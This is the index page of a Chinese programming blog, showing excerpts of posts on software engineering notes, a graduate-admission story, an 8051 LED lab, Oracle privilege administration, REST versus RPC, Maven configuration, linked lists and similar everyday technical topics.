<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7afa2c3aa03339c8c95337e902649513/" rel="bookmark">
			软件工程知识点汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言第1章 绪论1.1 软件和软件危机1.1.3 软件危机 1.2 软件工程学的范畴1.2.1 软件开发方法学 1.3 软件工程的发展1.3.1 3种编程范型 第2章 软件生存周期与软件过程2.1 软件生存周期2.2 传统的软件过程2.2.1 瀑布模型（大题常考）特点阶段缺点存在的问题 2.2.2 快速原型模型原型开发的优越性原型模型的启示 2.3 软件演化模型2.3.1 增量模型（incremental model）2.3.2 螺旋模型（spiral model）2.3.3 构件集成模型 2.4 形式化方法模型2.4.1 转换模型（transformational model）2.4.2 净室模型（cleanroom model） 2.5 统一过程和敏捷过程2.5.1 统一过程（Rational Unified Process,RUP）2.5.2 敏捷过程2.5.3 极限编程（extreme programming,XP） 2.6 软件可行性研究2.6.1 可行性研究的内容与步骤1. 研究的内容 2.6.2 软件风险分析 第3章 结构化分析与设计3.1 概述3.1.1 结构化分析与设计的由来结构化分析（structured analysis,SA）结构化设计（structured design,SD） 3.1.2 SA 模型的组成与描述1. SA 模型的组成2. SA 模型的描述工具(1) 数据流图（DFD）(2) 数据字典（DD）(3) 加工规格说明 3.1.3 SD 模型的组成与描述1. SD 模型的组成2. SD 模型的描述工具(1) SC 图的组成符号(2) SC 图的模块调用 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7afa2c3aa03339c8c95337e902649513/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/461476ac05c1d3d0e2a5cd83b15c3e9b/" rel="bookmark">
			北航数理统计大作业_【保研故事】四非通信保研边缘人如何绝处逢生推免北航！...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		保研轻询-中国保研（推免）问答咨询第一品牌​www.baoyan360.com 前言
我本科就读于省属四非学校，保研率不超过5%，所以我到大三上学期结束也不能确定自己能否保研，而且就以往本专业保研来看，保研院校也主要是以偏远地区211为主，所以我在大三下学期开学就做了两手准备，在准备考研的同时也在积极申请夏令营、联系导师。
个人情况
本科学校：青岛大学
专业：通信工程
排名：1/101（前六学期），3/101（前五学期）
英语：CET4:535,CET6:512
科研：IEEE会议论文三篇，中文普刊三篇（并非全是第一作者）
Offer：北京交通大学学硕，北京航空航天大学电子信息工程学院专硕，大连理工大学专硕，北京邮电大学直博，浙江大学直博，天津大学直博。
推免院校：北京航空航天大学电子信息工程学院
保研历程
2019/2-2019/3—搜集信息
在这两个月里，我搜集了目标院校的一些夏令营的招生简章，根据自己的实际情况和目标院校的招生简章，初步确定了自己的保底、平行、冲刺的院校。
并尝试联系一些在这些院校读研的学长学姐（比如通过学院的考研光荣榜就可以了解上一级学长学姐的去向，这是一个不错的方法），通过他们打听一些导师的信息，他们提供的信息可靠性还是比较大的，可以有效的避开差导师。保研确实就是一场信息战，了解较为全面的信息是必胜的关键。
2019/4-2019/6—海投夏令营
我在三月初就准备好了自己的个人简历、成绩单、成绩排名证明以及扫描了证书，准备好了给了导师发的邮件模板，随着自己论文不断地被接收，我的简历也在渐渐地丰富。
在这段时间里，各个院校的夏令营会陆陆续续出来，我在这段时间都是保证电脑不离身，每天都要关注目标院校的网站，不要错过重要的信息。牢记夏令营申请的重要节点，在备忘录上做好标记。每个夏令营都需要盖章签字甚至还要有专家推荐信，所以我去学院院楼来来回回好多次。
夏令营联系导师获北交博导回邮
期间，我也给很多老师发了邮件，大多都是石沉大海，杳无音信，只有北京交通大学的一位博导L老师热情的回复了我的邮件。
我本科学校保研或者考研到北京交通大学的学长学姐很多，所以北交对我的认可度还是不错的。L老师对我的成绩十分的肯定，十分欢迎我去北京交通大学读研深造。但是，因为学校的政策还未公布，老师未能确切答复我什么，所以我放下的心又悬起来了。
上科大老师1小时电面获夏令营入场券
在五月份时，我也联系到了上海科技大学的一位青千S老师，他首先对我进行了长达一个小时的电话面试，面试涉及到了很多的公共课和专业课的知识，比如高等数学、线性大数、概率论与数理统计、信号与系统、数字信号处理、复变函数等等。
我本身回答的并不好，但是因为我之前准备考研时复习过一些高数、线代、概率知识，所以他还是给了我一个参加上海科技大学夏令营的机会—夏令营入场券，我在几天后去山东大学青岛校区听上科大宣讲时就顺利地拿到了夏令营入场券。
我在宣讲会中了解到上科大的科研实力、师资力量雄厚，当时的想法就是如果无法推免到985院校，上科大确实是一个不错的选择。
2019/6-2019/7—参加夏令营
经过夏令营的海投，我能参加的夏令营就只有北京交通大学电子信息工程学院夏令营，上海科技大学信息学院夏令营，四川大学电子信息学院夏令营。根据对自己的定位，我只选择了北京交通大学的夏令营参加，作为一个保底的推免院校。
参加北交夏令营获优秀营员
北交的夏令营是不提供住宿的，而且六月的北京也很炎热。当时我就报了北交L老师的组的面试。面试前一天还约老师见面，阴差阳错之间却没有能和老师见面。在面试时我排在靠后的位置，再加上紧张，所以面试发挥的并不是很好。
不过可以看出，L老师对我还是帮助很大的，一直在给我打圆场。最后面试结果出来，我也是擦线通过了面试，获得了优秀营员的资格。
2019/7-2019/9—备战预推免
根据学校往年的推免政策，我预计自己会位列专业第一名，所以我在这几个月内积极准备预推免，争取推免到更高层次的学校。一方面，我在积极的准备专业基础知识的复习，因为之前的面试经验告诉我，面试肯定会问专业基础知识的。
另一方面，我也在积极联系导师，不停地发邮件，有的老师我还会发两封邮件。一旦有老师回复，我就像抓住救命稻草一样，疯狂的展示自己。
在准备预推免期间，我先后参加了北京邮电大学信息与通信工程学院的预推免面试、大连理工大学信息与通信工程学院的预推免面试。
险获北邮预推免面试offer
由于北邮是以课题组为单位组织面试，所以参加面试的老师一般就两三位，我参见的泛在无线网组的面试。面试的人只有两个双非学生，而且面试主管对于双非学生有比较大的歧视，所以我并没有拿到offer，虽然后来有一个老师主动联系我，答应给我直博的offer。
真的是山穷水尽疑无路，柳暗花明又一村。这个老师陆陆续续给我几篇论文让我看，选博士的研究方向，我当时是一块石头落地了。
顺利通过大连预推免面试
大连理工大学一般是给双非排名前5%且有国家奖的学生面试机会，而且一般就是给专硕，所以我参加的大连理工大学的面试也顺利通过了，东北人的豪爽真的让我感觉很舒服。
2019/9-2019/9/28—九推
在九月八号左右，学校的专业排名正式公布，我如愿位列专业第一，而且自己投稿的三篇IEEE会议论文也如愿接收。
天津大学直博面试走过场
报名的天津大学直博面试也顺利获得了面试资格，在面试时介绍了自己的科研经历、博士期间的规划等等。面试也没有问太多艰深的问题，最后才发现是走过场，只要老师同意接收，面试就一定会过。
严格的浙大信电直博考核
浙江大学信电学院直博考核时我参加的最严格的考核。上午是三个小时的笔试，笔试内容包括英语听力、英语阅读、线性代数、概率论、模电、数电、电路、高频电子线路、C语言八项内容，时长为两个半小时。
这是我参加的唯一一个有笔试的推免考核。当时大家考的都不是很好，因为没有想到笔试会考这么难的证明题。不过后来反应笔试占比不是很大。
在面试环节，每个人被分配一个号码，面试期间不能偷漏个人信息，不能给面试官看简历，每个人必须上交自己的手机，面试完的人取回自己的手机立即离开候场室。每个人要去五个房间分别面试，每个房间都会有几个老师（只有一个面试主管，他主要负责提问）。
面试主要是问了英语、通信原理、高频电子线路、数字信号处理等课程的知识，我在暑假早已复习完毕，所以顺利通过了面试环节，拿到了浙江大学信电学院直博的offer。
赶赴北航专硕面试
北京航空航天大学的面试是在浙大面试完的第三天，我从浙江乘飞机赶回青岛，在青岛北乘坐火车赶往北京，恰逢临近国庆，赶上了二次安检。北航面试收取一百元的报名费，这也是我第一次见的收取面试报名费的学校。第一天为学硕面试，第二天为专硕面试。
在第一天，我报完名就在北航新主楼的自习室里自习专业课程。第二天面试时，我排在倒数第三个（后来才知道，我是补录参加的面试）。北航的面试侧重专业基础知识的考察。面试时首先是英文自我介绍，然后是抽取左手边的一个纸条，回答纸条上的问题，然后是抽取右手边的纸条，回答纸条上的问题，最后就是老师提问环节。
北航二系的专业课考察主要是电磁场、模电、数学方面的，老师问的都很专业，如果不好好准备，很容易就被pass掉。
重新起航--北航硕士之路
虽然我坚定读博，但是考虑到直博风险太大，导师的人品、学术能力；对研究方向的兴趣等等因素，我最后在推免系统上只填报了北京航空航天大学，虽然浙江大学和天津大学研招办的老师之前就催了，但是我还是坚定地选择了硕士。一切都在2019年9月28日11：26分尘埃落定，而我的学生生涯又翻开了新的一页。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b711742e84aade0a062a4d03827f545d/" rel="bookmark">
			实验7-1_八段 LED 数码管显示实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验要求 用89C51单片机控制并行接口芯片8255实现6 位八段码 LED 动态方式循环显示一组数据。
二、8255接口芯片的简介 （1）8255芯片是什么 8255A是一种可编程并行I/O口的拓展芯片，可用于拓展多组8位并行I/O口。
（2）如何对8255芯片编程 其实，在程序编写上，8255芯片就相当于拓展一个外部RAM，对它的操作就用指令MOVX即可
我们需要对它的操作是：
1）对其控制字地址写入对各个I/O口的模式 其中方式0、方式1、方式2为：
所以我们如果需要使用PA口和PB口输出并且使用方式1的话，那么控制字写为1000 0000，则程序为：
MOV DPTR,#0FF23H //控制口地址 MOV A,#80H MOVX @DPTR,A 2）对各个I/O的地址写入需要显示的数字 MOV DPTR,#0FF21H //写入PB口数据 MOVX @DPTR,A MOV DPTR,#0FF20H //写入PA口数据 MOV A,R2 MOVX @DPTR,A （3）8255芯片与51单片机如何连接 单片机在拓展外部芯片时，通常都会使用74LS373作为地址锁存器。
值得一提的是，RD和WR是由硬件自动控制，不需要对其进行软件编程控制。
则单片机与8255的连接如下：
三、代码 1.汇编语言程序
OUTBIT EQU 0FF20H LEDBUF EQU 60H //存储数据 NUM EQU 70H //显示数据 DELAYT EQU 75H ORG 0000H LJMP START LEDMAP:DB 0C0H,0F9H,0A4H,0B0H,99H,92H,82H,0F8H DB 80H,90H,88H,83H,0C6H,0A1H,86H,8EH DELAY: MOV R7,#0 DELAYLOOP: DJNZ R7,DELAYLOOP DJNZ R6,DELAYLOOP RET DISPLAYLDE: MOV R0,#LEDBUF MOV R1,#6 MOV R2,#11011111B //从左边开始显示 LOOP: MOV DPTR,#OUTBIT MOV A,#0FFH MOVX @DPTR,A MOV A,@R0 MOV DPTR,#0FF21H MOVX @DPTR,A MOV DPTR,#OUTBIT MOV A,R2 MOVX @DPTR,A MOV R6,#8 CALL DELAY MOV A,R2 RR A //A循环右移 MOV R2,A INC R0 DJNZ R1,LOOP MOV DPTR,#OUTBIT MOV A,#0FFH MOVX @DPTR,A RET START: MOV DPTR,#0FF23H //控制口地址 MOV A,#81H MOVX @DPTR,A MOV SP,#40H //这句话是什么意思？ MOV NUM,#0 MLOOP: INC NUM MOV A,NUM MOV B,A MOV R0,#LEDBUF FILLBUF: MOV A,B ANL A,#0FH //确保A只有一位数（16进制） MOV DPTR,#LEDMAP MOVC A,@A+DPTR MOV @R0,A INC R0 INC B CJNE R0,#LEDBUF+6,FILLBUF MOV DELAYT,#00 DISPAGAIN: CALL DISPLAYLDE DJNZ DELAYT,DISPAGAIN LJMP MLOOP END 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b711742e84aade0a062a4d03827f545d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9c95b191241af477ea1d1316ffd63e7/" rel="bookmark">
			Oracle数据库DBA权限回收操作参考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 基本操作指令 查看当前系统 ORACLE_SID（linux） # su - oracle $ cat /etc/oratab orcl:/oracle/app/oracle/product/11.2.0/dbhome_1:N crm:/oracle/app/oracle/product/11.2.0/dbhome_1:N 查看当前系统 ORACLE_SID（windows）
依次打开【控制面板】—【系统安全】—【管理工具】—【服务】
查找跟OracleService开头的相关服务，比如OracleServiceORCL、OracleServiceCRM等，有几个这样的服务就有几个实例切换ORACLE_SID（linux） $ echo $ORACLE_SID orcl $ export ORACLE_SID=crm $ echo $ORACLE_SID crm $ sqlplus / as sysdba 切换ORACLE_SID（windows） C:\Users\sqluser&gt; sqlplus sys/passwd@crm as sysdba 或者 C:\Users\sqluser&gt; set oracle_sid=crm C:\Users\sqluser&gt; sqlplus /nolog SQL&gt; connect /as sysdba 或 SQL&gt; connect sys/passwd@crm as sysdba SQL&gt; select name from v$database; 或 SQL&gt; select instance_name from v$instance; 2. 权限回收准备工作 备注：先执行如下语句，筛选是否具有DBA权限的用户，如果没有（除sys/system用户外），之后的操作可忽略。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9c95b191241af477ea1d1316ffd63e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23818a5f71cfbfc02bb1e80e094f878b/" rel="bookmark">
			XXL_JOB 首次使用遇到的小问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.执行器地址为空
这个难为了小半天 就是没有获取到相应的地址 ，XXLJOB有一套自己的执行器系统会自己获取相应的Ip 我们只需要将数据库的配置处理好就可以了 首次接触可以先不用自己配置直接copy相应配置就好了
另外还有一个问题 引用的core 的版本要一致呀 MD 我就一时大意 xxl_job_admin 和自己的执行器项目引用的版本不一致 导致查了好久才发现 ，改成一致的直接运行了；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc4cb1feb30c5b0fdf520a9b8e080a68/" rel="bookmark">
			ECS架构笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ECS由三个部分构成：
Entity：实体、个体。由多个component组成
Component：组件、数据。由数据组成
System：系统。由逻辑组成
Component： 组件Component是一个基类，有几百个子类，每个子类都有System执行Behavior时所需的成员变量。这里的多态是用来重写Create，以及使用虚析构函数管理声明周期，帮助回收垃圾。另外可能有访问内部状态的helper函数，除此之外Component不应该有Behavior。
class Component{ virtual void Create(resource* m_resource); virtual ~Component(); } Entity: 一个Entity其实像是一个对象，可以代表游戏世界中的任意对象，而其内部包含了若干个Component，拥有全局唯一的EntityID，用于标识Entity本身，ID是一个32位无符号整数。
class Entity{ unsigned int ID; vector&lt;Component&gt; components; } System 而System则是系统，是行为，用来制定游戏规则。System本身没有数据，只有方法。在应用中，System之间不可以直接通信，并且一个System只关心某一个固定的Component组合，这个组合称为tuple。
**使用一个System的条件：**System会遍历所有Entity，若Entity当中，拥有System中tuple指定的所有Component，则对该Entity进行处理。
System本身并不关心Entity是谁，它只关心Entity中包含的component。
class System{ public: virtual void update(f32 timeStep)=0; virtual ~System(); } class HitSystem:public System{ vector&lt;Component&gt; tuple; public: virtual void update(f32 timeStep){//其实这段代码干了什么我真不清楚 for(DerpComponent* d:ComponentItr&lt;DerpComponent&gt;(m_admin)){ d-&gt;m_timeAccu+=timeStep; if(d-&gt;m_timeAccu&gt;d-&gt;m_timeToHerp) this-&gt;HerpYourDerp(d,d-&gt;Sibling&lt;HerpComponent&gt;()); } } for(Entity &amp;entity:world.entitys) { if(/*entity中有tuple中的所有component*/) {//对应处理： } } } } 实际上的System和tuple的例子：
//tuple struct PhysicsTuple { DynamicPhysicsComponent* m_dynamicPhysics; TransformComponent* m_transform; ContactListComponent* m_contacts; } //system void PhysicsSystem::Tick(f32 timeStep) { IPhysicWorld* pw=GetPhysicsWorld(); pw-&gt;Update(timestep); //write transeforms of dynamic physics objects for(PhysicsTuple&amp; t:getPhysicsTuples()) { IPhysicsProxy* proxy=pw-&gt;GetProxy(t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc4cb1feb30c5b0fdf520a9b8e080a68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bde754aec7373c90e1b989ed167d4a1/" rel="bookmark">
			Rest和RPC接口区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		无论是Google、Amazon、netflix，还是阿里，实际上内部都是采用性能更高的RPC方式，而对外开放的才是RESTful。
1 REST接口
1.1 定义：REST是一种架构设计风格，提供了设计原则和约束条件。而满足这些约束条件和原则的应用程序或设计就是RESTful架构或服务。通过HTTP协议定义的通用动词方法(GET、PUT、DELETE、POST) ，以URI对网络资源进行唯一标识，响应端根据请求端的不同需求，通过无状态通信，对其请求的资源进行表述。
1.2 RESTful API设计
RESTful API一般分为对外和对内。对外的RESTful API为面向公网的公共服务接口，此类接口一般可以通过公网直接访问，或者经过一定的安全认证后（一般使用OAuth 2）通过公网访问。而对内的RESTful API主要是一套系统内部各个子系统或模块之间交互的标准接口。
URL指向资源，HTTP动词指向操作
按照REST的要求，Restful API的URL地址应指向具体的一个资源，例如用户user。URL中应当只包含资源名词，不应该包含指向操作的动词，例如新建、查询、修改、删除等。具体操作通过 HTTP 动词（ GET / POST / PUT / DELETE ）指定。
指定版本号
在设计 Restful API 时，特别是对外的 API ，通常需要考虑 API 多版本的问题
因为 API 会进行升级，而客户端则处于不可控状态，可能无法及时对 API 调用过程进行配合升级。因此，服务端需要提供对不同版本 API 的支持，同时，客户端在调用 API 时也需要指定特定的版本号，以确保调用过程正常进行。
指定参数
在Restful API请求中，可能需要根据不同的情况进行过滤，需要增加操作参数。一般来说，针对GET和DELTE请求需要增加操作参数的情况较多，而POST和PUT更多的是通过HTTP报文体提供操作数据信息。
例如：https://baidu.com/rt/user?id=123&amp;type=Admin
1.3 应用：
http相对更规范，更标准，更通用，无论哪种语言都支持http协议。如果你是对外开放API，例如开放平台，外部的编程语言多种多样，你无法拒绝对每种语言的支持，相应的，如果采用http，无疑在你实现SDK之前，支持了所有语言，所以，现在开源中间件，基本最先支持的几个协议都包含RESTful。
2 RPC接口
2.1 概念：
应对不断增长的用户量及海量的请求，互联网应用的后端基本都是规模庞大的分布式集群，而RPC（远程过程调用）系统便是其中的核心技术。RPC是一种通过网络从远程计算机程序上请求服务来得到计算服务或者数据服务，且不需要了解底层网络技术的协议和框架。由于RPC具有简单、高效和通用等特性，市场迅速扩大，使得风靡一时的HTTP RESTful服务在远程通信技术上已经不再独树一帜了。
2.2 RPC原理
RPC架构里包含如下4个组件:
客户端(Client)：服务调用方
客户端存根(Client Stub)：存放服务端地址信息，将客户端的请求参数打包成网络消息，再通过网络发送给服务方
服务端存根(Server Stub)：接受客户端发送过来的消息并解包，再调用本地服务
服务端(Server)：真正的服务提供者。
实现步骤：
客户端调用本地的客户端存根方法，对于客户端程序来说，这个调用很自然，因为它是一个普通的本地方法。客户端存根的方法会将参数打包并封装成一个或多个网络消息体并发送到服务端；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bde754aec7373c90e1b989ed167d4a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd2d3629fed0208966dde1b504cd0130/" rel="bookmark">
			Vscode通过vue指令生成vue模板页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vscode通过vue指令生成vue模板页面 查找vue.json 查找vue.json 通过文件=》首选项=》用户代码片段
输入vue.json，找到vue.json
输入一下模板
{ // Example: "Print to console": { "prefix": "vue", "body": [ "&lt;template&gt;", " &lt;div&gt;$0&lt;/div&gt;", "&lt;/template&gt;", "", "&lt;script&gt;", "//这里可以引入其他文件（比如组件，工具js，第三方插件js，json文件，图片文件等等）", "//列如：import &lt;&lt;组件名称&gt;&gt; from '《组件路径》';", "export default {", "//import引入的组件需要注入到对象中才能使用", " components: {},", " props: {},", " data() {", "//这里存放数据", " return {", " };", " },", "//监控data中的数据变化", " watch: {},", "//计算属性，类似于data概念", " computed: {},", "//方法集合", " methods: {},", "//生命周期，创建完成（可以访问当前this实例）", " created() {},", "//生命周期，挂载完成（可以访问dom元素）", " mounted() {},", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd2d3629fed0208966dde1b504cd0130/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92aa3a5c284e347d04a2422c9ee55cfb/" rel="bookmark">
			mysql 修改编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL的默认编码是Latin1，不支持中文，要支持中午需要把数据库的默认编码修改为gbk或者utf8。
1、需要以root用户身份登陆才可以查看数据库编码方式(以root用户身份登陆的命令为：&gt;mysql -u root –p,之后两次输入root用户的密码)，查看数据库的编码方式命令为:
1
2
3
4
5
6
7
8
9
10
11
12
13
&gt;show variables like 'character%';
+--------------------------+----------------------------+
| Variable_name | Value |
+--------------------------+----------------------------+
| character_set_client | latin1 |
| character_set_connection | latin1 |
| character_set_database | latin1 |
| character_set_filesystem | binary |
| character_set_results | latin1 |
| character_set_server | latin1 |
| character_set_system | utf8 |
| character_sets_dir | /usr/share/mysql/charsets/ |
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92aa3a5c284e347d04a2422c9ee55cfb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/693a8e8a6fd8f77c425c98818aa73b9f/" rel="bookmark">
			Maven插件 maven-compiler-plugin 讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Maven插件 maven-compiler-plugin 讲解 作用: 1. 指示maven用什么版本的jdk编译; 2. 指示IntelliJ IDEA把项目识别成什么jdk
maven是个项目管理工具，如果我们不告诉它我们的代码要使用什么样的jdk版本编译的话，它就会用maven-compiler-plugin默认的jdk版本来进行处理，这样就容易出现版本不匹配，以至于可能导致编译不通过的问题。
maven的默认编译使用的jdk版本貌似很低，使用maven-compiler-plugin插件可以指定项目源码的jdk版本，编译后的jdk版本，以及编码。
&lt;plugin&gt; &lt;!-- 指定maven编译的jdk版本,如果不指定,maven3默认用jdk 1.5 maven2默认用jdk1.3 --&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;configuration&gt; &lt;!-- 一般而言，target与source是保持一致的，但是，有时候为了让程序能在其他版本的jdk中运行(对于低版本目标jdk，源代码中不能使用低版本jdk中不支持的语法)，会存在target不同于source的情况 --&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;!-- 源代码使用的JDK版本 --&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;!-- 需要生成的目标class文件的编译版本 --&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt;&lt;!-- 字符集编码 --&gt; &lt;skipTests&gt;true&lt;/skipTests&gt;&lt;!-- 跳过测试 --&gt; &lt;verbose&gt;true&lt;/verbose&gt; &lt;showWarnings&gt;true&lt;/showWarnings&gt; &lt;fork&gt;true&lt;/fork&gt;&lt;!-- 要使compilerVersion标签生效，还需要将fork设为true，用于明确表示编译版本配置的可用 --&gt; &lt;executable&gt;&lt;!-- path-to-javac --&gt;&lt;/executable&gt;&lt;!-- 使用指定的javac命令，例如：&lt;executable&gt;${JAVA_1_4_HOME}/bin/javac&lt;/executable&gt; --&gt; &lt;compilerVersion&gt;1.3&lt;/compilerVersion&gt;&lt;!-- 指定插件将使用的编译器的版本 --&gt; &lt;meminitial&gt;128m&lt;/meminitial&gt;&lt;!-- 编译器使用的初始内存 --&gt; &lt;maxmem&gt;512m&lt;/maxmem&gt;&lt;!-- 编译器使用的最大内存 --&gt; &lt;compilerArgument&gt;-verbose -bootclasspath ${java.home}\lib\rt.jar&lt;/compilerArgument&gt;&lt;!-- 这个选项用来传递编译器自身不包含但是却支持的参数选项 --&gt; &lt;/configuration&gt; &lt;/plugin&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a4b806ece52da98459eda915ecfd825/" rel="bookmark">
			Enable VT-x in your BIOS security settings, ensure that HAXM is installed properly
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击android studio--&gt;Tools--&gt;AVD Manager--&gt;+ Create Virtual Device...--&gt;Virtual Device Configuration--&gt;Phone--&gt;随便点一个--&gt;Next。出现这个问题：
Enable VT-x in your BIOS security settings, ensure that HAXM is installed properly
我进入boot，确定已经做了
1.检查BIOS中的设置确保打开CPU 的Virtualization
2.关闭Sercue Boot
后面看到这个网页：
https://blog.csdn.net/qq_35582562/article/details/103186710
解决方法如下：
(1)进入网页：https://github.com/intel/haxm/releases/tag/v7.5.1，下载 haxm-windows_v7_5_1.zip
(2)点击开始--&gt;所有程序--&gt;控制面板--&gt;程序和功能--&gt;Intel@ Hardware Accelerated Execution Manager--&gt;卸载
如果不做这一步，直接做下面一步，会出现这个问题：
A newer version of Intel@Hardware Accelerated Execution Manager is already
installed. The current installtion will exit. If you really want to downgrade, you
can uninstall the newer version from control panel first and then install the older
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a4b806ece52da98459eda915ecfd825/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fab2a22f5394d7443fd81c992604525/" rel="bookmark">
			数组与链表的区别_算法数据结构：链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、什么是链表 相对比数组，链表是一种稍微复杂一点的数据结构，其学习成本也要比数组要高一些。数组和链表是两个非常基础，且非常常用的数据结构。而链表的结构也是五花八门的，本篇文章主要介绍：「单链表」、「双向链表」和「循环链表」。
2、链表和数组的区别 从图中可以发现，数组需要一块连续的内存空间来存储，对内存的要求比较高。如果我们申请一个100MB大小的数组，当内存中没有连续的、足够大的内存空间时，即便内存的剩余总可用空间大于100MB，仍然会申请失败。
对于链表来说，恰恰相反，它不需要连续的内存空间，它通过指针(Java里叫引用)将一组零散的内存空间串联起来使用，所以当我们申请100MB大小的链表，根本不会有问题。与数组一样，链表也支持数据的查找、插入和删除操作。
3、几种常用的链表 3.1、单链表 链表是通过指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的「结点」。为了将所有的结点串起来，每个链表的结点除了存储数据之外，还需要记录链上的下一个结点的地址。如图所示，我们把记录下一个结点的指针叫作「后继指针next」。一个链表中有两个比较特殊的结点，他们分别是「第一结点(头结点)」 和「最后一个结点(尾结点)」。其中，头结点用来记录链表的的基地址，有了它，我们就可以遍历得到整条链表了。而尾结点的特殊地方是，指针不是指向下一个结点，而是指向一个「空地址Null」，表示这是链表上最右一个结点。
在进行数组的插入和删除操作时，为了保持内存数据的连续性，需要做大量的数据搬移，所以时间复杂度是O(n)。而在链表中插入或删除一个数据，我们并不需要为了保持内存的连续性而搬移结点，因为链表的存储空间本身就不是连续的。所以，在链表中插入和删除一个数据是非常快的。在链表的插入和删除操作的过程，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度是O(1)。
但是，链表要随机访问第k个元素，就没有数组那么高效了。因为链表的数据结构并非连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就能直接计算出对应的内存地址，而是需要根据指针一个结点一个结点地依次遍历，直到找到对应的结点。链表的随机访问性能没有数组好，需要O(n)的时间复杂度。
3.2、循环链表 循环链表是一种「特殊的单链表」，它跟单链表唯一的区别就在尾结点。我们知道单链表的尾结点指向空地址，表示这就是最后一个结点了。而循环链表的尾结点指针是指向链表的头结点。如下图所示，它像是一个环一样选一样首尾相连，所以叫做「循环链表」和单链表相比，循环链表的优点是从链尾到链头比较方便。当有处理的数据具有环型结构特点时，就特别适合采用循环链表。
3.3、双向链表 单向链表只有一个方向，结点只有一个后继指针next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止一个「后继指针next」 指向后面的结点，还有一个「前驱指针prev」 指向前面的结点。
从图中可以发现，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支撑双向遍历，这样也带来了双向链表操作的灵活性。
从结构上看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的插入、删除等操作都要比单链表简单、高效。
